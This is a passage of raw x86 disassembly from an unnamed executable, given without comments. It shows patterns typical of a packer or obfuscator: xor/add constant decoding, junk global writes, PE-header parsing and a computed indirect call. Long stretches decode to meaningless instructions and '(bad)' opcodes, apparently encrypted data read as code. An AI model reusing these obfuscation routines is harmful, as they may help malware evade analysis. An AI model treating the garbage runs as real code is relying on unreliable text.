  406156:	mov    eax,ds:0x409020
  40615b:	mov    eax,DWORD PTR [eax]
  40615d:	mov    DWORD PTR [ebp+0xc],eax
  406160:	mov    eax,ds:0x409228
  406165:	mov    eax,DWORD PTR [eax]
  406167:	mov    DWORD PTR [ebp-0x60],eax
  40616a:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  406171:	mov    eax,DWORD PTR [ebp+0x10]
  406174:	xor    eax,esi
  406176:	add    eax,ebx
  406178:	mov    DWORD PTR [ebp+0x10],eax
  40617b:	mov    eax,ds:0x4091a0
  406180:	mov    DWORD PTR [ebp+0x10],eax
  406183:	mov    eax,DWORD PTR [ebp+0xc]
  406186:	mov    DWORD PTR [ebp+0x10],eax
  406189:	mov    eax,DWORD PTR [ebp+0x10]
  40618c:	push   0x4
  40618e:	pop    ecx
  40618f:	sub    ecx,eax
  406191:	add    ecx,DWORD PTR [ebp-0x60]
  406194:	mov    DWORD PTR [ebp-0x34],edi
  406197:	mov    DWORD PTR [ebp-0x10],ecx
  40619a:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  4061a4:	mov    eax,DWORD PTR [ebp+0x10]
  4061a7:	mov    DWORD PTR [ebp-0xc4],eax
  4061ad:	mov    eax,DWORD PTR [ebp-0x10]
  4061b0:	mov    DWORD PTR [ebp-0xc0],eax
  4061b6:	mov    eax,DWORD PTR [ebp-0x34]
  4061b9:	xor    eax,esi
  4061bb:	add    eax,ebx
  4061bd:	mov    DWORD PTR [ebp-0xbc],eax
  4061c3:	lea    eax,[ebp-0x80]
  4061c6:	mov    DWORD PTR [ebp-0xb8],eax
  4061cc:	mov    eax,DWORD PTR [ebp-0xc8]
  4061d2:	xor    eax,esi
  4061d4:	add    eax,ebx
  4061d6:	mov    DWORD PTR [ebp-0xc8],eax
  4061dc:	lea    eax,[ebp-0xc8]
  4061e2:	push   eax
  4061e3:	mov    eax,DWORD PTR [ebp-0x8]
  4061e6:	xor    eax,esi
  4061e8:	add    eax,ebx
  4061ea:	push   eax
  4061eb:	mov    eax,ds:0x4091c0
  4061f0:	push   0x409116
  4061f5:	push   DWORD PTR [eax]
  4061f7:	call   0x406f1d
  4061fc:	and    DWORD PTR [ebp+0xc],0x0
  406200:	mov    eax,DWORD PTR [ebp-0x10]
  406203:	sub    eax,DWORD PTR [ebp+0xc]
  406206:	push   eax
  406207:	mov    eax,DWORD PTR [ebp+0x10]
  40620a:	add    eax,DWORD PTR [ebp+0xc]
  40620d:	push   eax
  40620e:	call   0x40196f
  406213:	inc    DWORD PTR [ebp+0xc]
  406216:	cmp    DWORD PTR [ebp+0xc],0x52
  40621a:	jb     0x406200
  406220:	mov    eax,DWORD PTR [ebp-0x8]
  406223:	mov    eax,ds:0x4091a0
  406228:	mov    DWORD PTR [ebp+0x10],eax
  40622b:	mov    eax,ds:0x4092ac
  406230:	mov    DWORD PTR [ebp-0x68],eax
  406233:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  40623a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	xor    eax,esi
  406246:	add    eax,ebx
  406248:	mov    DWORD PTR [ebp-0x7c],eax
  40624b:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  406252:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40625c:	mov    DWORD PTR [ebp-0x78],edi
  40625f:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  406266:	mov    eax,DWORD PTR [ebp+0xc]
  406269:	xor    eax,esi
  40626b:	add    eax,ebx
  40626d:	mov    DWORD PTR [ebp-0x38],eax
  406270:	mov    DWORD PTR [ebp-0x48],0xf89c8530
  406277:	mov    BYTE PTR [ebp-0x29],0x57
  40627b:	mov    eax,DWORD PTR [ebp+0xc]
  40627e:	xor    eax,esi
  406280:	add    eax,ebx
  406282:	mov    DWORD PTR [ebp-0x38],eax
  406285:	mov    eax,DWORD PTR [ebp-0x64]
  406288:	xor    eax,esi
  40628a:	add    eax,ebx
  40628c:	push   eax
  40628d:	mov    eax,DWORD PTR [ebp-0x70]
  406290:	xor    eax,esi
  406292:	add    eax,ebx
  406294:	push   eax
  406295:	mov    eax,DWORD PTR [ebp-0x48]
  406298:	xor    eax,esi
  40629a:	add    eax,ebx
  40629c:	push   eax
  40629d:	lea    eax,[ebp-0x10c]
  4062a3:	push   eax
  4062a4:	push   DWORD PTR [ebp+0xc]
  4062a7:	push   DWORD PTR [ebp-0x4]
  4062aa:	call   0x40467f
  4062af:	test   eax,eax
  4062b1:	je     0x4062e2
  4062b7:	lea    eax,[ebp-0x10c]
  4062bd:	push   eax
  4062be:	mov    eax,DWORD PTR [ebp-0x4]
  4062c1:	xor    eax,esi
  4062c3:	add    eax,ebx
  4062c5:	push   eax
  4062c6:	mov    eax,DWORD PTR [ebp+0x10]
  4062c9:	add    eax,0xaa
  4062ce:	push   eax
  4062cf:	mov    eax,DWORD PTR [ebp+0x10]
  4062d2:	mov    eax,DWORD PTR [eax+0x198]
  4062d8:	push   DWORD PTR [eax]
  4062da:	call   0x406f1d
  4062df:	mov    DWORD PTR [ebp-0x24],eax
  4062e2:	cmp    DWORD PTR [ebp-0x24],0x0
  4062e6:	lea    edi,[ebp+0x4]
  4062e9:	mov    DWORD PTR [ebp-0x7c],edi
  4062ec:	je     0x4063b6
  4062f2:	lea    eax,[ebp-0x38]
  4062f5:	push   eax
  4062f6:	mov    eax,DWORD PTR [ebp-0x78]
  4062f9:	xor    eax,esi
  4062fb:	add    eax,ebx
  4062fd:	push   eax
  4062fe:	mov    eax,DWORD PTR [ebp-0x48]
  406301:	xor    eax,esi
  406303:	add    eax,ebx
  406305:	push   eax
  406306:	push   DWORD PTR [ebp-0x24]
  406309:	lea    eax,[ebp-0x10c]
  40630f:	push   eax
  406310:	push   DWORD PTR [ebp+0xc]
  406313:	push   DWORD PTR [ebp-0x4]
  406316:	call   0x404cef
  40631b:	test   eax,eax
  40631d:	je     0x40634b
  406323:	lea    eax,[ebp-0x10c]
  406329:	push   eax
  40632a:	mov    eax,DWORD PTR [ebp-0x4]
  40632d:	xor    eax,esi
  40632f:	add    eax,ebx
  406331:	push   eax
  406332:	mov    eax,DWORD PTR [ebp+0x10]
  406335:	add    eax,0xee
  40633a:	push   eax
  40633b:	mov    eax,DWORD PTR [ebp+0x10]
  40633e:	mov    eax,DWORD PTR [eax+0x198]
  406344:	push   DWORD PTR [eax]
  406346:	call   0x406f1d
  40634b:	mov    ecx,DWORD PTR [ebp-0x48]
  40634e:	xor    ecx,esi
  406350:	mov    eax,0xffcd8d62
  406355:	sub    eax,ecx
  406357:	sub    eax,DWORD PTR [ebp-0x24]
  40635a:	mov    ecx,DWORD PTR [ebp-0x68]
  40635d:	add    ecx,eax
  40635f:	mov    eax,DWORD PTR [ebp-0x24]
  406362:	mov    DWORD PTR [eax+0x1],ecx
  406365:	mov    al,BYTE PTR [ebp-0x29]
  406368:	mov    ecx,DWORD PTR [ebp-0x24]
  40636b:	xor    al,0x49
  40636d:	sub    al,0x35
  40636f:	mov    BYTE PTR [ecx],al
  406371:	lea    eax,[ebp-0x24]
  406374:	inc    BYTE PTR [eax]
  406376:	inc    eax
  406377:	push   eax
  406378:	pop    ecx
  406379:	dec    ecx
  40637a:	xchg   ecx,edx
  40637c:	dec    BYTE PTR [edx]
  40637e:	push   DWORD PTR [ebp+0x10]
  406381:	mov    eax,ds:0x40925c
  406386:	mov    eax,DWORD PTR [eax]
  406388:	push   DWORD PTR [eax]
  40638a:	lea    eax,ds:0x409278
  406390:	push   DWORD PTR [eax]
  406392:	lea    eax,ds:0x409024
  406398:	push   DWORD PTR [eax]
  40639a:	lea    eax,ds:0x409258
  4063a0:	push   DWORD PTR [eax]
  4063a2:	lea    eax,ds:0x409390
  4063a8:	push   DWORD PTR [eax]
  4063aa:	xchg   ebx,edx
  4063ac:	inc    ebx
  4063ad:	inc    ebx
  4063ae:	sub    ebx,0x3
  4063b1:	push   ebx
  4063b2:	pop    eax
  4063b3:	call   DWORD PTR [eax+0x1]
  4063b6:	mov    DWORD PTR [ebp-0x6c],edi
  4063b9:	mov    eax,DWORD PTR [ebp-0x3c]
  4063bc:	mov    eax,DWORD PTR [ebp-0x18]
  4063bf:	push   DWORD PTR [ebp-0x20]
  4063c2:	lea    eax,[ebp-0x6c]
  4063c5:	push   eax
  4063c6:	call   0x4034f6
  4063cb:	mov    eax,ds:0x4091a0
  4063d0:	push   0x4
  4063d2:	add    eax,0x1cc
  4063d7:	push   eax
  4063d8:	lea    eax,[ebp-0x3c]
  4063db:	push   eax
  4063dc:	call   0x402c87
  4063e1:	mov    eax,DWORD PTR [ebp-0x3c]
  4063e4:	mov    eax,DWORD PTR [eax]
  4063e6:	pop    edi
  4063e7:	pop    esi
  4063e8:	pop    ebx
  4063e9:	leave  
  4063ea:	ret    0xc
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x20
  4063f3:	leave  
  4063f4:	ret    0x4
  4063f7:	push   ebp
  4063f8:	mov    ebp,esp
  4063fa:	push   ecx
  4063fb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406402:	sub    eax,DWORD PTR ds:0x4292d9
  406408:	mov    eax,DWORD PTR [ebp+0x8]
  40640b:	or     DWORD PTR ds:0x42759c,0x4292bd
  406415:	mov    al,BYTE PTR [eax]
  406417:	add    al,0x35
  406419:	and    DWORD PTR ds:0x427cf7,0x42c89e
  406423:	xor    al,0x49
  406425:	mov    DWORD PTR ds:0x4292a9,0x8ce
  40642f:	cmp    al,0xcb
  406431:	mov    DWORD PTR ds:0x4292d5,0x323c
  40643b:	jne    0x4064e2
  406441:	and    DWORD PTR ds:0x4292c1,0x0
  40644b:	xor    ecx,ecx
  40644d:	or     ecx,DWORD PTR ds:0x4292c1
  406453:	inc    ecx
  406454:	mov    DWORD PTR ds:0x4292c1,ecx
  40645a:	cmp    DWORD PTR ds:0x4292c1,0xa
  406461:	jne    0x40647a
  406467:	push   DWORD PTR [ebp-0x18]
  40646a:	push   0x641f
  40646f:	push   0x4275a8
  406474:	call   DWORD PTR ds:0x427ac3
  40647a:	cmp    DWORD PTR ds:0x4292c1,0x9
  406481:	jne    0x406496
  406487:	xor    ecx,ecx
  406489:	or     ecx,DWORD PTR ds:0x4292c1
  40648f:	inc    ecx
  406490:	mov    DWORD PTR ds:0x4292c1,ecx
  406496:	cmp    DWORD PTR ds:0x4292c1,0x1d
  40649d:	jb     0x40644b
  4064a3:	mov    eax,DWORD PTR [ebp+0x8]
  4064a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4064a9:	add    ecx,DWORD PTR [eax+0x3c]
  4064ac:	mov    edx,0x7510857
  4064b1:	mov    DWORD PTR [ebp+0x8],ecx
  4064b4:	mov    eax,DWORD PTR [ebp-0x4]
  4064b7:	xor    eax,edx
  4064b9:	push   esi
  4064ba:	mov    esi,DWORD PTR [ebp+0x8]
  4064bd:	mov    ecx,0x32729e
  4064c2:	add    eax,ecx
  4064c4:	cmp    DWORD PTR [esi+0x54],eax
  4064c7:	pop    esi
  4064c8:	je     0x4064d6
  4064ce:	mov    eax,DWORD PTR [ebp+0x8]
  4064d1:	jmp    0x4064ef
  4064d6:	mov    eax,DWORD PTR [ebp-0x4]
  4064d9:	xor    eax,edx
  4064db:	add    eax,ecx
  4064dd:	jmp    0x4064ef
  4064e2:	mov    eax,DWORD PTR [ebp-0x4]
  4064e5:	xor    eax,0x7510857
  4064ea:	add    eax,0x32729e
  4064ef:	leave  
  4064f0:	ret    0x4
  4064f3:	push   ebp
  4064f4:	mov    ebp,esp
  4064f6:	push   ecx
  4064f7:	push   ecx
  4064f8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4064ff:	xor    DWORD PTR ds:0x427d1b,0x4292a5
  406509:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406510:	mov    eax,DWORD PTR [ebp-0x4]
  406513:	push   esi
  406514:	mov    esi,DWORD PTR [ebp-0x8]
  406517:	xor    DWORD PTR ds:0x427d03,0x39
  406521:	jmp    0x40669a
  406526:	mov    al,cs:0xfbf5fbf3
  40652c:	data16 jge 0x40659b
  40652f:	inc    ecx
  406530:	xor    eax,0xd57fe75e
  406535:	dec    ebp
  406536:	jg     0x406561
  406538:	jl     0x4065b6
  40653a:	fdivr  DWORD PTR [edi+0x7c]
  40653d:	jl     0x40655c
  40653f:	jbe    0x406503
  406541:	xchg   ebx,eax
  406542:	mov    eax,0x63b02078
  406547:	jnp    0x4064c9
  406549:	rcl    bl,0xb5
  40654c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654d:	and    BYTE PTR [edx+ebx*1],0xe
  406551:	jb     0x406583
  406553:	push   esp
  406554:	nop
  406555:	push   edi
  406556:	scas   eax,DWORD PTR es:[edi]
  406557:	mov    dl,dl
  406559:	add    al,0x5
  40655b:	push   0x3b
  40655d:	inc    eax
  40655e:	arpl   WORD PTR [edi-0x62cffb97],bp
  406564:	dec    DWORD PTR [ebx-0x70ad84e6]
  40656a:	inc    ebx
  40656b:	iret   
  40656c:	dec    eax
  40656d:	shl    BYTE PTR [edx+ebp*2-0x6a],0xc6
  406572:	popa   
  406573:	and    bl,BYTE PTR [ebx-0x68]
  406576:	cli    
  406577:	test   BYTE PTR cs:[ebx+0x3c],ah
  40657b:	data16 cs outs dx,BYTE PTR ss:[esi]
  40657f:	retf   0x441c
  406582:	inc    esp
  406583:	std    
  406584:	mov    ebx,0x2afdca4c
  406589:	mov    al,ds:0x54a84c69
  40658e:	mov    ecx,DWORD PTR [eax]
  406590:	and    ebx,edi
  406592:	and    eax,0xfd0a3571
  406597:	call   0x127db1e9
  40659c:	push   esp
  40659d:	popa   
  40659e:	mov    ch,0x97
  4065a0:	popf   
  4065a1:	mov    edi,0xe52441a7
  4065a6:	pop    ds
  4065a7:	icebp  
  4065a8:	dec    eax
  4065a9:	(bad)  
  4065aa:	pop    ds
  4065ab:	or     al,bh
  4065ad:	or     eax,0xb5537b7c
  4065b2:	push   esp
  4065b3:	in     al,dx
  4065b4:	das    
  4065b5:	shl    DWORD PTR [esi+0x2d],1
  4065b8:	ss cld 
  4065ba:	test   eax,0xe76f251e
  4065bf:	retf   
  4065c0:	mov    ds:0x5b37ed81,eax
  4065c5:	lahf   
  4065c6:	dec    esi
  4065c7:	inc    eax
  4065c8:	adc    DWORD PTR [esp+ecx*4+0x19],edi
  4065cc:	mov    eax,?
  4065ce:	or     eax,0xfb906495
  4065d3:	pushf  
  4065d4:	aam    0xff
  4065d6:	xchg   edi,eax
  4065d7:	mov    bl,0xe4
  4065d9:	nop
  4065da:	ret    0x6800
  4065dd:	add    DWORD PTR [ebp+0x66],edi
  4065e0:	add    al,0x88
  4065e2:	and    BYTE PTR [ebx-0x34],dl
  4065e5:	cmp    BYTE PTR [eax],dh
  4065e7:	(bad)  
  4065e8:	ins    DWORD PTR es:[edi],dx
  4065e9:	pushf  
  4065ea:	jo     0x4065d4
  4065ec:	inc    esi
  4065ed:	xor    cl,BYTE PTR [eax]
  4065ef:	jp     0x406600
  4065f1:	in     eax,dx
  4065f2:	cmp    eax,0x22565205
  4065f7:	ret    
  4065f8:	mov    dh,0xfe
  4065fa:	loop   0x406617
  4065fc:	and    BYTE PTR [ebp+0x65],cl
  4065ff:	dec    ebx
  406600:	fs pop es
  406602:	(bad)  
  406603:	or     BYTE PTR [eax+0x22d6490b],dl
  406609:	cwde   
  40660a:	mov    BYTE PTR [ebp+0x14f70627],ah
  406610:	ds cld 
  406612:	mov    al,ds:0x5ab0b354
  406617:	xchg   esi,eax
  406618:	cld    
  406619:	xor    ch,ch
  40661b:	push   edi
  40661c:	push   ebp
  40661d:	sub    DWORD PTR ds:0xd17420d4,ebp
  406623:	test   eax,0x4ef84ef4
  406628:	dec    eax
  406629:	jne    0x4065c6
  40662b:	leave  
  40662c:	arpl   cx,di
  40662e:	inc    esp
  40662f:	addr16 mov ebp,0xcf85e43b
  406635:	les    eax,FWORD PTR [ebx+edx*8-0x5a]
  406639:	pop    esp
  40663a:	mov    ebp,0x5d7f3b6c
  40663f:	xchg   BYTE PTR [edx-0x1529af0c],ah
  406645:	lahf   
  406646:	pop    es
  406647:	loop   0x40665b
  406649:	stos   DWORD PTR es:[edi],eax
  40664a:	jecxz  0x4066b9
  40664c:	inc    ecx
  40664d:	dec    esi
  40664e:	call   0x133458b1
  406653:	lock mov dh,0x14
  406656:	std    
  406657:	push   edx
  406658:	fs xchg edi,ecx
  40665b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40665c:	sbb    al,0x4b
  40665e:	push   cs
  40665f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406660:	xlat   BYTE PTR ds:[ebx]
  406661:	xchg   esi,eax
  406662:	cmc    
  406663:	or     ah,BYTE PTR [ecx]
  406665:	scas   al,BYTE PTR es:[edi]
  406666:	mov    edi,0xc94abef3
  40666b:	xchg   esp,eax
  40666c:	dec    ebp
  40666d:	(bad)  
  40666e:	sbb    eax,0x32d4c85a
  406673:	pop    esi
  406674:	ficomp DWORD PTR [esp+ebx*8]
  406677:	test   ebx,ecx
  406679:	adc    edi,DWORD PTR [esi-0x63]
  40667c:	loopne 0x4066a9
  40667e:	mov    esi,0xbef4f269
  406683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406685:	xchg   ebp,eax
  406686:	sub    BYTE PTR [eax-0x2f18e8c3],ah
  40668c:	push   0xffffffc8
  40668e:	test   DWORD PTR [ecx-0x572edc3a],ecx
  406694:	leave  
  406695:	or     ecx,DWORD PTR [edi+0x72]
  406698:	add    al,0x79
  40669a:	mov    edx,0x7510857
  40669f:	xor    eax,edx
  4066a1:	adc    DWORD PTR ds:0x4292a5,0x7cf1
  4066ab:	xor    esi,edx
  4066ad:	mov    ecx,0x32729e
  4066b2:	sbb    DWORD PTR ds:0x42c89a,0x427594
  4066bc:	add    esi,ecx
  4066be:	or     DWORD PTR ds:0x42c892,0x2710
  4066c8:	add    eax,ecx
  4066ca:	sbb    DWORD PTR ds:0x4292b5,0x4275ac
  4066d4:	imul   eax,esi
  4066d7:	mov    DWORD PTR ds:0x42c896,0x5e2a
  4066e1:	mov    esi,DWORD PTR [ebp+0xc]
  4066e4:	mov    DWORD PTR ds:0x427d03,0x704c
  4066ee:	cmp    esi,eax
  4066f0:	mov    DWORD PTR ds:0x427d1f,0x38e6
  4066fa:	jne    0x4068f9
  406700:	mov    DWORD PTR ds:0x4275b0,0x11
  40670a:	cmp    DWORD PTR ds:0x4275b0,0x0
  406711:	je     0x40675a
  406717:	cmp    DWORD PTR ds:0x4275b0,0x1b
  40671e:	jne    0x406746
  406724:	push   DWORD PTR [ebp-0x28]
  406727:	push   0x3cc8
  40672c:	push   0x5307
  406731:	push   0x1b9a
  406736:	push   0x3e4a
  40673b:	push   0x4274
  406740:	call   DWORD PTR ds:0x427c6b
  406746:	xor    esi,esi
  406748:	or     esi,DWORD PTR ds:0x4275b0
  40674e:	dec    esi
  40674f:	mov    DWORD PTR ds:0x4275b0,esi
  406755:	jmp    0x40670a
  40675a:	mov    eax,DWORD PTR [ebp-0x4]
  40675d:	xor    esi,esi
  40675f:	xor    esi,DWORD PTR ds:0x42c8de
  406765:	mov    esi,DWORD PTR [esi]
  406767:	adc    DWORD PTR ds:0x4292d5,esi
  40676d:	mov    esi,DWORD PTR [ebp-0x8]
  406770:	xor    eax,edx
  406772:	xor    esi,edx
  406774:	add    eax,ecx
  406776:	add    esi,ecx
  406778:	jmp    0x4068f1
  40677d:	dec    eax
  40677e:	cmp    al,0x31
  406780:	and    ecx,DWORD PTR [ebp+0x25]
  406783:	jp     0x4067ec
  406785:	pop    edx
  406786:	inc    esp
  406787:	push   cs
  406788:	and    eax,0x3589a5d5
  40678d:	fld    TBYTE PTR [eax]
  40678f:	jl     0x40680d
  406791:	fdivr  DWORD PTR [edi+0x7c]
  406794:	jl     0x406815
  406796:	dec    edx
  406797:	jns    0x4067f6
  406799:	(bad)  
  40679a:	or     eax,0x6636da5c
  40679f:	adc    eax,0xb4c121f8
  4067a4:	das    
  4067a5:	or     esp,DWORD PTR [edx+0x27]
  4067a8:	add    al,BYTE PTR [edi]
  4067aa:	ror    DWORD PTR [ebx],cl
  4067ac:	and    ecx,DWORD PTR [ecx+edi*1]
  4067af:	hlt    
  4067b0:	shl    BYTE PTR [edx+0x55],0x68
  4067b4:	sbb    edi,edi
  4067b6:	cmp    eax,0x4facb8c8
  4067bb:	fcom   QWORD PTR ds:0xb559fa2b
  4067c1:	test   al,0x28
  4067c3:	mov    ebx,0x37a90d60
  4067c8:	jl     0x406796
  4067ca:	mov    cl,0x5f
  4067cc:	dec    edi
  4067cd:	mov    BYTE PTR [edi],cl
  4067cf:	inc    eax
  4067d0:	adc    eax,0xe04b761d
  4067d5:	lock jmp 0x60ad450f
  4067db:	ja     0x406819
  4067dd:	shl    esp,1
  4067df:	shr    DWORD PTR [esi],1
  4067e1:	mov    cl,0x40
  4067e3:	adc    DWORD PTR [eax-0x60918a4],ebp
  4067e9:	(bad)  
  4067eb:	sahf   
  4067ec:	sahf   
  4067ed:	pop    ebp
  4067ee:	add    BYTE PTR [edi-0x39ee623d],dh
  4067f4:	sub    eax,0x2cd84b68
  4067f9:	mov    DWORD PTR [edi],ebp
  4067fb:	icebp  
  4067fc:	add    esp,DWORD PTR [eax]
  4067fe:	dec    ecx
  4067ff:	xor    eax,0x6853745b
  406804:	pop    esi
  406805:	aas    
  406806:	loop   0x4067de
  406808:	or     DWORD PTR [esi],eax
  40680a:	push   ecx
  40680b:	xor    ebp,DWORD PTR [eax]
  40680d:	aam    0xe4
  40680f:	lahf   
  406810:	dec    eax
  406811:	and    DWORD PTR [esi-0x13],ecx
  406814:	push   edx
  406815:	clc    
  406816:	xlat   BYTE PTR ds:[ebx]
  406817:	gs cwde 
  406819:	stc    
  40681a:	jmp    0xfc7951d8
  40681f:	add    DWORD PTR [eax+0x46],edx
  406822:	adc    edx,DWORD PTR [eax+0x39]
  406825:	cdq    
  406826:	bound  edx,QWORD PTR [eax-0x75bcfa29]
  40682c:	lods   eax,DWORD PTR ds:[esi]
  40682d:	fsubr  DWORD PTR [ebx-0x58a7082]
  406833:	push   esp
  406834:	xchg   edx,eax
  406835:	leave  
  406836:	lock (bad) 
  406838:	fucomi st,st(1)
  40683a:	shl    BYTE PTR [ebp-0x6a1f346e],cl
  406840:	push   ss
  406841:	jns    0x4067cc
  406843:	lock rcr DWORD PTR [edi+0x1a],0xed
  406848:	lock (bad) 
  40684a:	mov    edx,0xb5331176
  40684f:	jnp    0x4068a5
  406851:	sti    
  406852:	stos   DWORD PTR es:[edi],eax
  406853:	std    
  406854:	cmp    DWORD PTR [edx-0x32116c2a],edi
  40685a:	xor    BYTE PTR [esi],al
  40685c:	mov    al,ds:0xa8bd73f8
  406861:	repz (bad) 
  406863:	stc    
  406864:	leave  
  406865:	scas   eax,DWORD PTR es:[edi]
  406866:	xchg   ecx,eax
  406867:	test   DWORD PTR [edx],esp
  406869:	adc    BYTE PTR [esi],bl
  40686b:	mov    edx,edi
  40686d:	mov    ds:0x4a5880c7,eax
  406872:	int3   
  406873:	shl    BYTE PTR [ebx],cl
  406875:	mov    cl,0x29
  406877:	sub    ah,bh
  406879:	sar    bl,1
  40687b:	mov    BYTE PTR [edi+edi*4],al
  40687e:	in     al,dx
  40687f:	push   ss
  406880:	clc    
  406881:	rcr    DWORD PTR [ebp+0x7b4180ed],1
  406887:	cmp    al,0x68
  406889:	mov    esi,0x2edad0c3
  40688e:	scas   eax,DWORD PTR es:[edi]
  40688f:	sub    al,0x28
  406891:	jnp    0x406857
  406893:	xor    edi,esp
  406895:	jl     0x4068b9
  406897:	cmp    bl,BYTE PTR [edi]
  406899:	push   edx
  40689a:	add    al,BYTE PTR [ebx+esi*4-0x2bee078a]
  4068a1:	outs   dx,BYTE PTR ds:[esi]
  4068a2:	repnz and BYTE PTR [edx],bh
  4068a5:	cld    
  4068a6:	add    DWORD PTR [ecx],edx
  4068a8:	shl    BYTE PTR [esi-0x2893d307],1
  4068ae:	sbb    dh,bl
  4068b0:	add    eax,0x9a5cbc8d
  4068b5:	in     al,0x20
  4068b7:	scas   eax,DWORD PTR es:[edi]
  4068b8:	sbb    ebx,DWORD PTR [esi+0x6c]
  4068bb:	std    
  4068bc:	test   DWORD PTR [edx+0xd9d2266],edx
  4068c2:	in     eax,0x4b
  4068c4:	lock call 0x23a9:0x17f27997
  4068cc:	mov    edx,0x28a9274a
  4068d1:	jns    0x4068d3
  4068d3:	sub    BYTE PTR [ebp+0x53ba5cc6],bl
  4068d9:	jo     0x4068c9
  4068db:	cli    
  4068dc:	pop    eax
  4068dd:	sahf   
  4068de:	push   esi
  4068df:	lods   eax,DWORD PTR ds:[esi]
  4068e0:	mov    edx,0xe6f450b8
  4068e5:	cwde   
  4068e6:	stos   BYTE PTR es:[edi],al
  4068e7:	scas   eax,DWORD PTR es:[edi]
  4068e8:	sbb    eax,0x8187eb1b
  4068ed:	inc    edx
  4068ee:	mov    edx,0xaf0f330a
  4068f3:	(bad)  
  4068f4:	jmp    0x406f18
  4068f9:	mov    eax,DWORD PTR [ebp+0xc]
  4068fc:	jmp    0x406a75
  406901:	mov    eax,0x65210ec9
  406906:	stc    
  406907:	mov    ebx,0x4f39e44d
  40690c:	pop    ebp
  40690d:	lahf   
  40690e:	add    edx,esp
  406910:	out    dx,al
  406911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406912:	sub    edi,DWORD PTR [esp+edi*2-0x28]
  406916:	jg     0x406994
  406918:	jl     0x406943
  40691a:	inc    ebx
  40691b:	or     ebp,0xffffffb5
  40691e:	and    eax,0x43931bd3
  406923:	mov    bl,0x26
  406925:	mov    bl,0xc3
  406927:	mov    ebx,0xfa406286
  40692c:	or     dh,BYTE PTR [esi-0x34dbb352]
  406932:	push   ss
  406933:	cmp    dh,BYTE PTR [ebx+0x2e]
  406936:	xor    DWORD PTR [ebx-0x42],esp
  406939:	jmp    0x4ec29e8
  40693e:	in     al,0x64
  406940:	jle    0x4068cf
  406942:	mov    ecx,0x4b492e98
  406947:	stos   DWORD PTR es:[edi],eax
  406948:	retf   
  406949:	cmp    DWORD PTR [edi],edx
  40694b:	(bad)  
  40694c:	in     al,0xcc
  40694e:	sahf   
  40694f:	xchg   ebx,eax
  406950:	cdq    
  406951:	std    
  406952:	(bad)  
  406953:	or     BYTE PTR [edx+0x87f8b7c],cl
  406959:	push   eax
  40695a:	dec    esp
  40695b:	and    DWORD PTR [ebp-0x58388c65],ebx
  406961:	adc    BYTE PTR [edx],bh
  406963:	dec    ecx
  406964:	std    
  406965:	push   eax
  406966:	mov    ebp,0xffd4b90
  40696b:	ret    0x2bc5
  40696e:	jp     0x4069a3
  406970:	dec    eax
  406971:	ds pop eax
  406973:	mov    al,ds:0xe771334
  406978:	dec    edi
  406979:	dec    ebx
  40697a:	outs   dx,BYTE PTR ds:[esi]
  40697b:	mov    DWORD PTR [ecx],esi
  40697d:	fiadd  DWORD PTR [eax]
  40697f:	adc    BYTE PTR [ecx-0xf34d596],bh
  406985:	int    0x13
  406987:	pop    ss
  406988:	xchg   DWORD PTR [ebx],eax
  40698a:	push   eax
  40698b:	fs push eax
  40698d:	dec    esi
  40698e:	mov    DWORD PTR [ebp+0x65a56e6a],ebp
  406994:	lds    ecx,FWORD PTR [ebp-0x249deaf]
  40699a:	xor    al,BYTE PTR [eax]
  40699c:	std    
  40699d:	cs xchg edi,eax
  40699f:	inc    edx
  4069a0:	ror    DWORD PTR ss:[ebx],cl
  4069a3:	push   ss
  4069a4:	dec    ecx
  4069a5:	test   al,0x27
  4069a7:	(bad)  
  4069a8:	int3   
  4069a9:	adc    eax,DWORD PTR [ecx]
  4069ab:	scas   al,BYTE PTR es:[edi]
  4069ac:	jae    0x7a645780
  4069b2:	jnp    0x40699c
  4069b4:	nop
  4069b5:	fdivr  DWORD PTR [eax]
  4069b7:	inc    esp
  4069b8:	sub    ah,BYTE PTR [ecx+0x6]
  4069bb:	add    DWORD PTR [ecx],ebp
  4069bd:	enter  0xa766,0x91
  4069c1:	mov    ds:0xb278713d,al
  4069c6:	clc    
  4069c7:	mov    BYTE PTR [ecx],bl
  4069c9:	dec    esi
  4069ca:	mov    al,0xa0
  4069cc:	xor    al,0x2b
  4069ce:	(bad)  
  4069cf:	xor    eax,0xbe3e2a6
  4069d4:	xchg   ecx,eax
  4069d5:	ret    0xd93c
  4069d8:	int    0x3d
  4069da:	add    BYTE PTR [ebp+0x3ced58e],bl
  4069e0:	call   0xe0885776
  4069e5:	leave  
  4069e6:	arpl   WORD PTR [ebx+0x26f534bc],dx
  4069ec:	int    0x3a
  4069ee:	data16 fs or al,0x46
  4069f2:	call   0xfb93:0xa5271f2
  4069f9:	xchg   BYTE PTR [esi],ah
  4069fb:	jbe    0x406a2c
  4069fd:	and    DWORD PTR [edi-0x728e7d78],0xffffffad
  406a04:	es jbe 0x4069ea
  406a07:	or     edx,DWORD PTR [eax-0x3927585b]
  406a0d:	(bad)  
  406a0e:	mov    ah,0xdd
  406a10:	aad    0xf8
  406a12:	or     eax,0x71fe4e83
  406a17:	int3   
  406a18:	retf   
  406a19:	dec    esp
  406a1a:	pop    es
  406a1b:	jns    0x406a41
  406a1d:	xchg   ebp,eax
  406a1e:	pop    esp
  406a1f:	popf   
  406a20:	push   edx
  406a21:	aas    
  406a22:	push   edi
  406a23:	test   BYTE PTR [ecx+0x6e],ah
  406a26:	sbb    BYTE PTR [edx+0x1ef067ec],bh
  406a2c:	ja     0x406a98
